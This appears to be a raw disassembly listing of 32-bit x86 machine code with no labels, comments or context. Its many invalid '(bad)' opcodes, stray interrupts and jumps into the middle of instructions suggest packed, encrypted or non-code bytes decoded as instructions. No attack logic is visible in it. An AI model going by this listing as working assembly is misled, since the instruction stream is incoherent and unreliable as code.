  42423b:	jl     0x42426d
  42423d:	xchg   DWORD PTR [ebp-0x5272f578],ecx
  424243:	int    0x8d
  424245:	std    
  424246:	int    0x96
  424248:	std    
  424249:	cmp    ecx,DWORD PTR [edi]
  42424b:	cmp    ebx,ecx
  42424d:	shr    ebx,cl
  42424f:	xchg   edx,eax
  424250:	shr    edx,cl
  424252:	sub    BYTE PTR [ebx+0x13],dl
  424255:	int    0x96
  424257:	std    
  424258:	or     cl,BYTE PTR [ebp+0xa88cd95]
  42425e:	lea    esi,[ebp+0x3bfd8dcd]
  424264:	cdq    
  424265:	cmp    esi,eax
  424267:	shl    edx,cl
  424269:	sub    bl,dl
  42426b:	repz xchg edx,eax
  42426d:	push   ebx
  42426e:	jecxz  0x42423d
  424270:	lea    esi,[ebp-0x792becbd]
  424276:	xchg   DWORD PTR [ebp-0x6a72f578],ecx
  42427c:	int    0x8d
  42427e:	std    
  42427f:	int    0x96
  424281:	std    
  424282:	cmp    ecx,DWORD PTR [edi]
  424284:	cmp    ebx,ecx
  424286:	shr    ebx,cl
  424288:	xchg   edx,eax
  424289:	shr    edx,cl
  42428b:	sub    BYTE PTR [ebx+0x13],dl
  42428e:	xchg   DWORD PTR [esp+ecx*2-0x37],edi
  424292:	jbe    0x424231
  424294:	popa   
  424295:	and    DWORD PTR [esi-0x777278cb],eax
  42429b:	or     cl,BYTE PTR [ebp-0x32781313]
  4242a1:	(bad)  
  4242a2:	in     eax,dx
  4242a3:	int    0x76
  4242a5:	dec    esp
  4242a6:	int    0x1
  4242a8:	adc    DWORD PTR [ecx+0x718080],eax
  4242ae:	xor    ch,cl
  4242b0:	jbe    0x4242fe
  4242b2:	add    dh,dl
  4242b4:	in     eax,dx
  4242b5:	int    0x1
  4242b7:	adc    DWORD PTR [ecx+0x70008080],eax
  4242bd:	dec    esp
  4242be:	leave  
  4242bf:	jbe    0x424266
  4242c1:	pop    DWORD PTR [ebp*1-0x5a89368a]
  4242c8:	dec    edx
  4242c9:	pop    ss
  4242ca:	xchg   BYTE PTR ds:0xcdfd8dcd,dh
  4242d0:	xchg   esi,eax
  4242d1:	std    
  4242d2:	cmp    ecx,DWORD PTR [edi]
  4242d4:	cmp    ebx,ecx
  4242d6:	shr    ebx,cl
  4242d8:	xchg   edx,eax
  4242d9:	shr    edx,cl
  4242db:	sub    BYTE PTR [ebx+0x13],dl
  4242de:	or     dh,BYTE PTR [esi-0x4b]
  4242e1:	inc    ebx
  4242e2:	jge    0x4242ba
  4242e4:	pop    eax
  4242e5:	int    0x76
  4242e7:	stc    
  4242e8:	int    0x8d
  4242ea:	stc    
  4242eb:	cmp    edi,DWORD PTR [ecx+0x3b]
  4242ee:	lock shl edx,cl
  4242f1:	sub    bl,dl
  4242f3:	mov    ebp,0xcdd35392
  4242f8:	lea    esp,[ebp+0x3ba596cd]
  4242fe:	fnstcw WORD PTR [ebx]
  424300:	psrlq  mm5,mm2
  424303:	sub    BYTE PTR [edi+0x4c76cd9d],al
  424309:	int    0x1
  42430b:	adc    DWORD PTR [ecx-0x142c7f80],eax
  424311:	xchg   edx,eax
  424312:	push   ebx
  424313:	jecxz  0x424344
  424315:	rcl    ebp,1
  424317:	bound  eax,QWORD PTR [eax]
  424319:	jo     0x42434f
  42431b:	int    0x76
  42431d:	std    
  42431e:	int    0x8d
  424320:	std    
  424321:	cmp    edi,DWORD PTR [ecx+0x3b]
  424324:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42432b:	push   ebx
  42432c:	rol    DWORD PTR [ebx+0x76],cl
  42432f:	mov    ch,0xd6
  424331:	and    ch,cl
  424333:	jbe    0x4242d2
  424335:	int    0x8d
  424337:	popf   
  424338:	cmp    esi,eax
  42433a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42433d:	mov    ebp,0x28f2d392
  424342:	push   ebx
  424343:	jge    0x424388
  424345:	fld    TBYTE PTR [edi]
  424347:	pop    es
  424348:	xchg   esp,eax
  424349:	add    BYTE PTR [eax],al
  42434b:	add    ch,cl
  42434d:	jbe    0x42434c
  42434f:	int    0x8d
  424351:	std    
  424352:	cmp    edi,DWORD PTR [ecx+0x3b]
  424355:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42435c:	push   ebx
  42435d:	rol    DWORD PTR [ebx+0x76],cl
  424360:	mov    ch,0xd6
  424362:	and    ch,cl
  424364:	jbe    0x42435f
  424366:	int    0x8d
  424368:	stc    
  424369:	cmp    edi,DWORD PTR [ecx+0x3b]
  42436c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424373:	push   ebx
  424374:	rol    DWORD PTR [ecx-0x5f14428a],cl
  42437a:	add    DWORD PTR [eax-0x12893680],0x67f1048e
  424384:	leave  
  424385:	jbe    0x42437c
  424387:	fdivr  st,st(4)
  424389:	sbb    al,0xb
  42438b:	int    0xa6
  42438d:	std    
  42438e:	int    0x76
  424390:	std    
  424391:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  424397:	xchg   edx,eax
  424398:	shr    DWORD PTR [ebp-0x1462acd8],cl
  42439e:	sbb    al,BYTE PTR [ecx+0x76cd8080]
  4243a4:	std    
  4243a5:	int    0x8d
  4243a7:	std    
  4243a8:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243ab:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243b2:	push   ebx
  4243b3:	ror    DWORD PTR [edx],cl
  4243b5:	jbe    0x4243a4
  4243b7:	int    0x76
  4243b9:	std    
  4243ba:	int    0x8d
  4243bc:	std    
  4243bd:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243c0:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243c7:	push   ebx
  4243c8:	ror    DWORD PTR [edx],cl
  4243ca:	jbe    0x4243c1
  4243cc:	int    0x8d
  4243ce:	std    
  4243cf:	int    0x76
  4243d1:	std    
  4243d2:	cmp    ecx,DWORD PTR [edi]
  4243d4:	cmp    ecx,ecx
  4243d6:	shr    DWORD PTR [ebp-0x6d142cd8],cl
  4243dc:	push   ebx
  4243dd:	jge    0x4243ac
  4243df:	jbe    0x424376
  4243e1:	inc    ebx
  4243e2:	jge    0x4243b8
  4243e4:	xchg   ch,cl
  4243e6:	test   BYTE PTR ds:0xcded760a,bl
  4243ec:	jbe    0x42439b
  4243ee:	int    0x84
  4243f0:	sbb    eax,0xcdf5760a
  4243f5:	jbe    0x4243f4
  4243f7:	int    0x8d
  4243f9:	std    
  4243fa:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243fd:	lock shl edx,cl
  424400:	sub    bl,dl
  424402:	mov    ebp,0xcdd35392
  424407:	(bad)  
  424408:	in     eax,dx
  424409:	inc    ebx
  42440a:	rcl    esp,cl
  42440c:	push   esp
  42440d:	int    0x76
  42440f:	std    
  424410:	int    0x8d
  424412:	std    
  424413:	cmp    esi,eax
  424415:	cmp    edi,DWORD PTR [ecx-0x2d]
  424418:	repnz sub bl,dl
  42441b:	mov    ebp,0xcdd35392
  424420:	(bad)  
  424421:	in     eax,dx
  424422:	shr    ebx,cl
  424424:	sub    al,BYTE PTR [ebx-0x2d]
  424427:	aam    0x1c
  424429:	int    0x8d
  42442b:	in     eax,dx
  42442c:	int    0x76
  42442e:	dec    esp
  42442f:	int    0x1
  424431:	adc    DWORD PTR [ecx-0x44d07f80],eax
  424437:	retf   
  424438:	jno    0x42443a
  42443a:	(bad)  
  42443b:	mov    ch,0x0
  42443d:	jo     0x4243c7
  42443f:	in     al,dx
  424440:	push   ds
  424441:	int    0x76
  424443:	cmc    
  424444:	xchg   DWORD PTR [esi-0x78],esi
  424447:	int    0x8d
  424449:	dec    esp
  42444a:	int    0xa
  42444c:	adc    DWORD PTR [ecx+0x6d048080],eax
  424452:	xchg   edx,eax
  424453:	jo     0x424455
  424455:	(bad)  
  424456:	mov    ch,0x0
  424458:	jno    0x4243e2
  42445a:	or     dh,BYTE PTR [esi-0xb]
  42445d:	int    0x76
  42445f:	std    
  424460:	int    0x8d
  424462:	std    
  424463:	cmp    edi,DWORD PTR [ecx+0x3b]
  424466:	lock shl edx,cl
  424469:	sub    bl,dl
  42446b:	mov    ebp,0xcdd35392
  424470:	(bad)  
  424471:	cmc    
  424472:	inc    ebx
  424473:	ror    ebp,cl
  424475:	jbe    0x424470
  424477:	int    0x8d
  424479:	stc    
  42447a:	(bad)  
  42447b:	xor    DWORD PTR [ebx],edi
  42447d:	jns    0x4244ba
  42447f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424486:	push   ebx
  424487:	rol    DWORD PTR [ecx+0x1cecbd76],cl
  42448d:	cmp    esi,eax
  42448f:	cmp    edi,DWORD PTR [ecx-0x2d]
  424492:	repnz sub bl,dl
  424495:	mov    ebp,0xcdd35392
  42449a:	(bad)  
  42449b:	cmc    
  42449c:	das    
  42449d:	rcl    ebx,1
  42449f:	int    0x8d
  4244a1:	lods   eax,DWORD PTR ds:[esi]
  4244a2:	or     al,BYTE PTR [edi+ebx*1-0x32068933]
  4244a9:	(bad)  
  4244aa:	stc    
  4244ab:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244ae:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4244b5:	push   ebx
  4244b6:	rol    DWORD PTR [edi-0x2893263],cl
  4244bc:	int    0x8d
  4244be:	std    
  4244bf:	cmp    esi,eax
  4244c1:	cmp    edi,DWORD PTR [ecx-0x2d]
  4244c4:	repnz sub bl,dl
  4244c7:	mov    ebp,0xcdd35392
  4244cc:	lea    ebp,[ebp+0x2f1f845e]
  4244d2:	push   es
  4244d3:	or     al,0xff
  4244d5:	add    BYTE PTR [eax],al
  4244d7:	int    0x76
  4244d9:	adc    ebp,ecx
  4244db:	lea    edx,[ecx]
  4244dd:	ins    BYTE PTR es:[edi],dx
  4244de:	sar    DWORD PTR [ebp-0x30b330d8],cl
  4244e4:	test   BYTE PTR [eax-0x2cac7f80],al
  4244ea:	int    0x8d
  4244ec:	icebp  
  4244ed:	push   esi
  4244ee:	dec    ecx
  4244ef:	and    DWORD PTR [esi-0x2ec14cb],eax
  4244f5:	add    BYTE PTR [eax],al
  4244f7:	int    0x76
  4244f9:	std    
  4244fa:	int    0x8d
  4244fc:	std    
  4244fd:	cmp    edi,DWORD PTR [ecx+0x3b]
  424500:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424507:	push   ebx
  424508:	rcr    DWORD PTR [esi+0x76],cl
  42450b:	mov    ebp,0x76cd88d6
  424510:	stc    
  424511:	int    0x8d
  424513:	stc    
  424514:	in     al,dx
  424515:	xchg   ch,cl
  424517:	jbe    0x424516
  424519:	int    0x8d
  42451b:	std    
  42451c:	cmp    esi,eax
  42451e:	cmp    edi,DWORD PTR [ecx-0x56]
  424521:	shl    edx,cl
  424523:	sub    bl,dl
  424525:	mov    ebp,0xd353a892
  42452a:	arpl   bx,cx
  42452c:	ror    BYTE PTR [eax-0x12326980],cl
  424532:	add    al,0xed
  424534:	xor    al,0xc9
  424536:	jbe    0x424535
  424538:	dec    ecx
  424539:	and    DWORD PTR [esi-0x528936cb],eax
  42453f:	inc    ecx
  424540:	and    DWORD PTR [esi+0x4c76cd35],eax
  424546:	or     dh,BYTE PTR [esi+0x4c]
  424549:	cwde   
  42454a:	int    0x6d
  42454c:	int    0x76
  42454e:	std    
  42454f:	int    0x96
  424551:	std    
  424552:	sar    bh,0x5f
  424555:	shl    DWORD PTR [ecx],1
  424557:	xchg   BYTE PTR ds:0x3ba8d33b,dh
  42455d:	cdq    
  42455e:	shr    edx,cl
  424560:	sub    bl,dl
  424562:	mov    ebp,0xcdd25392
  424567:	xchg   esi,eax
  424568:	mov    BYTE PTR [ebx-0xf],al
  42456b:	das    
  42456c:	add    eax,0x80808159
  424571:	int    0x76
  424573:	mov    ch,cl
  424575:	xchg   esi,eax
  424576:	mov    BYTE PTR [edi+0xa9a6470],al
  42457c:	xchg   esi,eax
  42457d:	cmc    
  42457e:	leave  
  42457f:	jbe    0x42457a
  424581:	popa   
  424582:	and    DWORD PTR [esi-0x68932cb],eax
  424588:	int    0x96
  42458a:	stc    
  42458b:	cmp    ebx,DWORD PTR [ecx+0x3b28ead3]
  424591:	rcl    ebx,cl
  424593:	mov    ebp,0xcdd25392
  424598:	xchg   esi,eax
  424599:	std    
  42459a:	int    0xe6
  42459c:	std    
  42459d:	cmp    esp,ebx
  42459f:	cmp    edi,edi
  4245a1:	shr    ecx,cl
  4245a3:	sub    bl,dl
  4245a5:	repz xchg edx,eax
  4245a7:	push   ebx
  4245a8:	fxch   st(5)
  4245aa:	out    0xf5,al
  4245ac:	pop    esi
  4245ad:	xchg   esp,eax
  4245ae:	leave  
  4245af:	fsubr  QWORD PTR [edi]
  4245b1:	add    eax,0x8080816b
  4245b6:	int    0x96
  4245b8:	cmc    
  4245b9:	int    0x76
  4245bb:	mov    BYTE PTR [edi-0x7f7fd2f5],al
  4245c1:	or     ch,0x96
  4245c4:	mov    ch,cl
  4245c6:	out    0xf5,al
  4245c8:	xor    ebx,DWORD PTR [edx-0x21932ac]
  4245ce:	pop    ebx
  4245cf:	int    0xa6
  4245d1:	std    
  4245d2:	cmp    edi,edx
  4245d4:	cmp    ebp,DWORD PTR [ecx-0x2c6def2d]
  4245da:	in     eax,0x28
  4245dc:	push   ebx
  4245dd:	cld    
  4245de:	or     dl,BYTE PTR [esi+0x2fd943a5]
  4245e4:	add    eax,0x8080814f
  4245e9:	int    0x96
  4245eb:	std    
  4245ec:	int    0xe6
  4245ee:	std    
  4245ef:	cmp    esp,ebx
  4245f1:	cmp    edi,edi
  4245f3:	shl    ebx,cl
  4245f5:	xchg   edx,eax
  4245f6:	shr    ecx,cl
  4245f8:	sub    BYTE PTR [ebx-0x27],dl
  4245fb:	or     dl,BYTE PTR [esi+0x4c76c911]
  424601:	mov    dl,0x21
  424603:	xchg   BYTE PTR ds:0xcdfd96cd,dh
  424609:	out    0xfd,al
  42460b:	cmp    esp,ebx
  42460d:	cmp    edi,edi
  42460f:	shl    ebx,cl
  424611:	xchg   edx,eax
  424612:	shr    ecx,cl
  424614:	sub    BYTE PTR [ebx-0x27],dl
  424617:	jmp    0x42461b
  424619:	add    BYTE PTR [eax-0x2693280],0xcd
  424620:	(bad)  
  424621:	std    
  424622:	add    al,0xf7
  424624:	(bad)  
  424625:	cmp    esp,ebx
  424627:	sar    DWORD PTR [ecx-0x6d0c2cd8],cl
  42462d:	push   ebx
  42462e:	cdq    
  42462f:	iret   
  424630:	ja     0x42462b
  424632:	jecxz  0x424623
  424634:	inc    ebx
  424635:	cdq    
  424636:	das    
  424637:	add    al,0x21
  424639:	add    BYTE PTR [eax-0x3004cc80],0xe4
  424640:	jo     0x4245ca
  424642:	or     dl,dh
  424644:	mov    ch,0x2f
  424646:	mov    ebx,0xea121a
  42464b:	das    
  42464c:	add    BYTE PTR [eax-0x321269f6],0x96
  424653:	in     eax,dx
  424654:	xchg   DWORD PTR [eax],esi
  424656:	int    0xd6
  424658:	in     eax,dx
  424659:	xchg   DWORD PTR [eax-0x2d],edx
  42465c:	repz sub bl,dl
  42465f:	mov    ecx,0x2ffb5392
  424664:	mov    ebx,0x4cf3d31a
  424669:	adc    dh,bh
  42466b:	dec    ecx
  42466c:	and    DWORD PTR [esi-0x1229f5cb],eax
  424672:	or     dl,BYTE PTR [esi-0x12693243]
  424678:	int    0xd6
  42467a:	in     eax,dx
  42467b:	cmp    esp,ebx
  42467d:	add    al,0xf7
  42467f:	call   ebx
  424681:	repz xchg edx,eax
  424683:	sar    DWORD PTR [ecx-0x7866acd8],cl
  424689:	xchg   esi,eax
  42468a:	mov    BYTE PTR [edx],cl
  42468c:	xchg   esi,eax
  42468d:	in     eax,dx
  42468e:	int    0x96
  424690:	dec    esp
  424691:	int    0xd6
  424693:	dec    esp
  424694:	cmp    esp,ebx
  424696:	add    al,0xf7
  424698:	call   ebx
  42469a:	mov    ecx,0x92f3d328
  42469f:	push   ebx
  4246a0:	cdq    
  4246a1:	int    0xd6
  4246a3:	mov    ebp,0x32d6fb43
  4246a8:	int    0x96
  4246aa:	dec    esp
  4246ab:	int    0xd6
  4246ad:	dec    esp
  4246ae:	cmp    esp,ebx
  4246b0:	add    al,0xf7
  4246b2:	call   ebx
  4246b4:	mov    ecx,0x92f3d328
  4246b9:	push   ebx
  4246ba:	cdq    
  4246bb:	int    0xd6
  4246bd:	mov    ebp,0x88d6fb43
  4246c2:	int    0x96
  4246c4:	in     eax,dx
  4246c5:	int    0xd6
  4246c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c8:	add    DWORD PTR [edx+0x4],0x8d0092c9
  4246cf:	mov    ch,0x2f
  4246d1:	push   es
  4246d2:	xchg   ebx,eax
  4246d3:	add    BYTE PTR [eax],al
  4246d5:	add    BYTE PTR [ecx-0x6932ee5a],al
  4246db:	stc    
  4246dc:	int    0xd6
  4246de:	stc    
  4246df:	cmp    esp,ebx
  4246e1:	add    al,0xf7
  4246e3:	call   ebx
  4246e5:	mov    ecx,0x92f3d328
  4246ea:	push   ebx
  4246eb:	cdq    
  4246ec:	int    0xd6
  4246ee:	adc    ebp,ecx
  4246f0:	out    0xf5,al
  4246f2:	inc    ebx
  4246f3:	aam    0xd9
  4246f5:	in     al,0x77
  4246f7:	sub    al,0xcd
  4246f9:	xchg   esi,eax
  4246fa:	std    
  4246fb:	int    0xd6
  4246fd:	std    
  4246fe:	cmp    esp,ebx
  424700:	add    al,0xf7
  424702:	call   ebx
  424704:	repz xchg edx,eax
  424706:	sar    DWORD PTR [ecx+0x53c58728],cl
  42470c:	cdq    
  42470d:	int    0x9c
  42470f:	test   BYTE PTR [ebx-0x1e],al
  424712:	das    
  424713:	push   es
  424714:	test   BYTE PTR [eax],al
  424716:	add    BYTE PTR [eax],al
  424718:	arpl   bp,cx
  42471a:	jbe    0x4246c9
  42471c:	cmp    edx,ebx
  42471e:	int    0x8d
  424720:	lods   eax,DWORD PTR ds:[esi]
  424721:	add    al,0x2
  424723:	jmp    FWORD PTR [edx+0x76cd4aec]
  424729:	std    
  42472a:	cmp    edx,ebx
  42472c:	int    0x8d
  42472e:	std    
  42472f:	cmp    ecx,DWORD PTR [edi]
  424731:	shl    edx,cl
  424733:	sub    bl,dl
  424735:	mov    ebp,0xa8d35392
  42473a:	retf   
  42473b:	ror    BYTE PTR [eax-0x12326980],cl
  424741:	adc    ch,ch
  424743:	xchg   ebp,eax
  424744:	add    BYTE PTR [eax-0x2893680],0x49
  42474b:	and    DWORD PTR [esi-0x68936cb],eax
  424751:	inc    ecx
  424752:	and    DWORD PTR [esi-0x28932cb],eax
  424758:	int    0x8d
  42475a:	std    
  42475b:	cwde   
  42475c:	call   0x8621:0xd169ffc0
  424763:	xor    eax,0xbdd3793b
  424768:	xchg   edx,eax
  424769:	mov    al,ds:0xf2d3133b
  42476e:	sub    BYTE PTR [ebx-0x2d],dl
  424771:	or     dh,BYTE PTR [esi-0x53]
  424774:	int    0x76
  424776:	std    
  424777:	int    0x8d
  424779:	std    
  42477a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42477d:	mov    ebp,0xd3133b92
  424782:	repnz sub BYTE PTR [ebx-0x2d],dl
  424786:	or     dh,BYTE PTR [esi-0xf]
  424789:	int    0xe6
  42478b:	and    al,0xcd
  42478d:	jbe    0x42477c
  42478f:	int    0x8d
  424791:	in     eax,dx
  424792:	cmp    edx,ebx
  424794:	or     dh,BYTE PTR [esi-0x13]
  424797:	adc    dh,BYTE PTR [esi-0x13]
  42479a:	dec    ecx
  42479b:	mov    al,ds:0x76cd3586
  4247a0:	cmc    
  4247a1:	int    0x8d
  4247a3:	cmc    
  4247a4:	cmp    edx,ebx
  4247a6:	or     dh,BYTE PTR [esi-0xb]
  4247a9:	adc    dh,BYTE PTR [esi-0xb]
  4247ac:	dec    ecx
  4247ad:	lahf   
  4247ae:	xchg   BYTE PTR ds:0xcd1176cd,dh
  4247b4:	lea    edx,[ecx]
  4247b6:	cmp    edx,ebx
  4247b8:	or     dh,BYTE PTR [esi+0x11]
  4247bb:	adc    dh,BYTE PTR [esi+0x11]
  4247be:	imul   esp,DWORD PTR [ecx],0x76cd3586
  4247c4:	mov    ch,0xcd
  4247c6:	lea    esi,[ebp+0x760ad33b]
  4247cc:	mov    ch,0x12
  4247ce:	jbe    0x424785
  4247d0:	dec    ecx
  4247d1:	and    DWORD PTR [ebp+esi*1+0x212476c9],eax
  4247d8:	hlt    
  4247d9:	mov    esi,DWORD PTR ds:0x68876cd
  4247df:	ins    DWORD PTR es:[edi],dx
  4247e0:	das    
  4247e1:	add    eax,0x80808551
  4247e6:	int    0x76
  4247e8:	dec    esp
  4247e9:	push   es
  4247ea:	ins    DWORD PTR es:[edi],dx
  4247eb:	das    
  4247ec:	add    eax,0x80808538
  4247f1:	int    0x76
  4247f3:	sbb    al,0x6
  4247f5:	ins    DWORD PTR es:[edi],dx
  4247f6:	das    
  4247f7:	add    eax,0x80808523
  4247fc:	int    0x76
  4247fe:	and    al,0xcd
  424800:	jbe    0x424826
  424802:	int    0x8d
  424804:	mov    bl,dl
  424806:	mov    ebp,0x39af5692
  42480b:	add    BYTE PTR [eax+0x2f815eb8],0x6
  424812:	add    DWORD PTR [ebp+0x76cd8080],0xfd8dcdfd
  42481c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42481f:	mov    ebp,0xd3133b92
  424824:	repnz sub BYTE PTR [ebx-0x2d],dl
  424828:	or     dh,BYTE PTR [esi-0xf]
  42482b:	int    0x76
  42482d:	std    
  42482e:	int    0x76
  424830:	std    
  424831:	int    0x76
  424833:	mov    ch,cl
  424835:	lea    ecx,[eax-0x329b8379]
  42483b:	outs   dx,BYTE PTR ds:[esi]
  42483c:	jo     0x424848
  42483e:	lea    esp,[esi+eax*1]
  424841:	ins    DWORD PTR es:[edi],dx
  424842:	das    
  424843:	add    eax,0x808084f0
  424848:	leave  
  424849:	jbe    0x4247e0
  42484b:	dec    ecx
  42484c:	and    DWORD PTR [eax+0x35],edi
  42484f:	int    0x76
  424851:	xchg   ebp,eax
  424852:	pop    ebx
  424853:	int    0xa6
  424855:	xchg   ebp,eax
  424856:	cmp    edi,DWORD PTR [ecx+0x3b]
  424859:	loop   0x42482e
  42485b:	mov    ebp,0x28e5d392
  424860:	push   ebx
  424861:	popf   
  424862:	or     ah,BYTE PTR [esi-0x289326b]
  424868:	int    0x76
  42486a:	std    
  42486b:	int    0x8
  42486d:	sub    eax,0xcd808081
  424872:	xor    ch,cl
  424874:	bound  esp,QWORD PTR [edi+eax*4+0x30]
  424878:	int    0x76
  42487a:	std    
  42487b:	int    0x76
  42487d:	std    
  42487e:	int    0x8
  424880:	and    eax,0xcd808081
  424885:	sbb    al,0xa
  424887:	xchg   esi,eax
  424888:	dec    esp
  424889:	inc    ebx
  42488a:	fst    st(6)
  42488c:	push   0xffffffcd
  42488e:	(bad)  
  42488f:	cmc    
  424890:	int    0x8
  424892:	adc    DWORD PTR [ecx-0x69307f80],eax
  424898:	lods   eax,DWORD PTR ds:[esi]
  424899:	(bad)  
  42489a:	int    0x96
  42489c:	cmc    
  42489d:	cmp    ecx,DWORD PTR [edi]
  42489f:	add    al,0xfb
  4248a1:	call   ebx
  4248a3:	jmp    0x424837
  4248a5:	shr    edx,cl
  4248a7:	sub    BYTE PTR [ebx-0x1d],dl
  4248aa:	int    0x8d
  4248ac:	dec    esp
  4248ad:	bound  eax,QWORD PTR [eax]
  4248af:	xchg   ecx,eax
  4248b0:	jo     0x42490d
  4248b2:	add    BYTE PTR [eax+0x24],dh
  4248b5:	int    0x8d
  4248b7:	dec    esp
  4248b8:	int    0x6e
  4248ba:	xchg   esp,eax
  4248bb:	int    0x7e
  4248bd:	jo     0x4248f2
  4248bf:	jge    0x424932
  4248c1:	xchg   ebp,eax
  4248c3:	jo     0x424882
  4248c5:	dec    esi
  4248c6:	xchg   BYTE PTR [eax+0x248dcd80],al
  4248cc:	int    0x8
  4248ce:	xor    eax,0xa808081
  4248d3:	sbb    al,0x0
  4248d5:	xchg   ecx,eax
  4248d6:	xchg   esp,eax
  4248d7:	add    dh,dl
  4248d9:	mov    BYTE PTR [ebx-0x43],bl
  4248dc:	or     eax,0xcd808084
  4248e1:	pop    ebx
  4248e2:	fs xchg ebp,edx
  4248e5:	das    
  4248e6:	mov    ebx,0x74cf1452
  4248eb:	xor    BYTE PTR [edx+ecx*1],bl
  4248ee:	jbe    0x42490c
  4248f0:	int    0x76
  4248f2:	std    
  4248f3:	int    0x8d
  4248f5:	std    
  4248f6:	cmp    edi,DWORD PTR [ecx+0x4]
  4248f9:	add    bh,bh
  4248fb:	shl    edx,cl
  4248fd:	sub    bl,dl
  4248ff:	mov    ebp,0x2fd35392
  424904:	mov    ebx,0x960a868a
  424909:	and    al,0x43
  42490b:	jge    0x42493c
  42490d:	add    eax,0x808080e9
  424912:	int    0x76
  424914:	std    
  424915:	int    0x8d
  424917:	std    
  424918:	cmp    edi,DWORD PTR [ecx+0x4]
  42491b:	add    bh,bh
  42491d:	shl    edx,cl
  42491f:	sub    bl,dl
  424921:	mov    ebp,0xad35392
  424926:	jbe    0x4248cd
  424928:	int    0x76
  42492a:	stc    
  42492b:	int    0x8d
  42492d:	stc    
  42492e:	add    al,0x2
  424930:	(bad)  
  424931:	cmp    edi,DWORD PTR [ecx-0x2d]
  424934:	repnz sub bl,dl
  424937:	mov    ebp,0x2fd35392
  42493c:	mov    ebx,0x7d33868a
  424941:	pop    esi
  424942:	lea    esp,[ebp-0x7f2ef7d1]
  424948:	add    BYTE PTR [eax+0x41c8dcd],0xd3
  42494f:	mov    BYTE PTR [edx],cl
  424951:	lea    ebx,[esp+ebp*8]
  424954:	xchg   ebp,ecx
  424956:	lea    ebx,[ecx*8+0x31cd5c52]
  42495d:	or     dh,BYTE PTR [esi-0x63]
  424960:	jl     0x424968
  424962:	icebp  
  424963:	aam    0x89
  424965:	clc    
  424966:	icebp  
  424967:	sub    edx,edx
  424969:	xchg   DWORD PTR [esi-0x63],esi
  42496c:	in     al,dx
  42496d:	xchg   edx,eax
  42496e:	int    0xd2
  424970:	jo     0x42493f
  424972:	outs   dx,BYTE PTR ds:[esi]
  424973:	test   BYTE PTR [edi+0x63bd70c5],al
  424979:	test   DWORD PTR [eax+0x1c76cd80],eax
  42497f:	int    0x7c
  424981:	mov    BYTE PTR [edx],cl
  424983:	lea    ebx,[ebp-0x32027233]
  424989:	xchg   esi,eax
  42498a:	std    
  42498b:	cmp    ecx,DWORD PTR [edi]
  42498d:	add    al,0xfb
  42498f:	call   ebx
  424991:	jmp    0x424925
  424993:	shr    edx,cl
  424995:	sub    BYTE PTR [ebx+0x13],dl
  424998:	pop    esi
  424999:	lea    ebx,[ebp-0x7232e32c]
  42499f:	mov    BYTE PTR [edi-0x29ffb384],al
  4249a5:	popf   
  4249a6:	int    0x6c
  4249a8:	test   BYTE PTR [ecx-0x79],dh
  4249ab:	lds    esi,FWORD PTR [eax-0x43]
  4249ae:	add    eax,DWORD PTR [edi+0x76cd8080]
  4249b4:	sbb    al,0xcd
  4249b6:	(bad)  
  4249b7:	stc    
  4249b8:	int    0x96
  4249ba:	stc    
  4249bb:	cmp    ecx,DWORD PTR [edi]
  4249bd:	shr    ebx,cl
  4249bf:	xchg   edx,eax
  4249c0:	add    al,0xfb
  4249c2:	inc    DWORD PTR [ebp*2+0x28ead33c]
  4249c9:	push   ebx
  4249ca:	adc    eax,DWORD PTR [ecx-0x69325a73]
  4249d0:	and    al,0xa
  4249d2:	jbe    0x4249f0
  4249d4:	int    0x76
  4249d6:	stc    
  4249d7:	int    0x8d
  4249d9:	stc    
  4249da:	add    al,0x2
  4249dc:	(bad)  
  4249dd:	cmp    edi,DWORD PTR [ecx-0x2d]
  4249e0:	repnz sub bl,dl
  4249e3:	mov    ebp,0xcdd35392
  4249e8:	lea    esp,[edi+ebp*1]
  4249eb:	mov    ebx,0x7d33867e
  4249f0:	pop    esi
  4249f1:	lea    esp,[ebp+0xa4072f]
  4249f7:	add    BYTE PTR [eax],al
  4249f9:	int    0x8
  4249fb:	and    eax,0x43808081
  424a00:	sbb    al,0xd6
  424a02:	cmp    ecx,ebp
  424a04:	lea    edx,[ecx]
  424a06:	int    0x8
  424a08:	adc    DWORD PTR [ecx-0x69307f80],eax
  424a0e:	lods   eax,DWORD PTR ds:[esi]
  424a0f:	(bad)  
  424a10:	int    0x96
  424a12:	adc    DWORD PTR [ebx],edi
  424a14:	(bad)  
  424a16:	sti    
  424a17:	call   ebx
  424a19:	jmp    0x4249ad
  424a1b:	shr    edx,cl
  424a1d:	sub    BYTE PTR [ebx-0x1d],dl
  424a20:	int    0x8d
  424a22:	dec    esp
  424a23:	bound  eax,QWORD PTR [eax]
  424a25:	xchg   ecx,eax
  424a26:	xchg   esp,eax
  424a27:	pop    ebx
  424a28:	add    BYTE PTR [eax+0x24],dh
  424a2b:	push   es
  424a2c:	ins    DWORD PTR es:[edi],dx
  424a2d:	das    
  424a2e:	add    eax,0x808092d9
  424a33:	int    0x96
  424a35:	and    al,0xcd
  424a37:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424a3d:	or     ch,0x7d
  424a40:	cmp    ecx,DWORD PTR [edi]
  424a42:	add    al,0x11
  424a44:	call   ebx
  424a46:	jmp    0x4249da
  424a48:	shr    DWORD PTR [ebp+0x2f7d5328],cl
  424a4e:	add    eax,0x808081da
  424a53:	int    0x76
  424a55:	std    
  424a56:	int    0x8d
  424a58:	std    
  424a59:	cmp    edi,DWORD PTR [ecx+0x4]
  424a5c:	add    bh,bh
  424a5e:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424a64:	push   ebx
  424a65:	ror    DWORD PTR [edx],cl
  424a67:	jbe    0x424a26
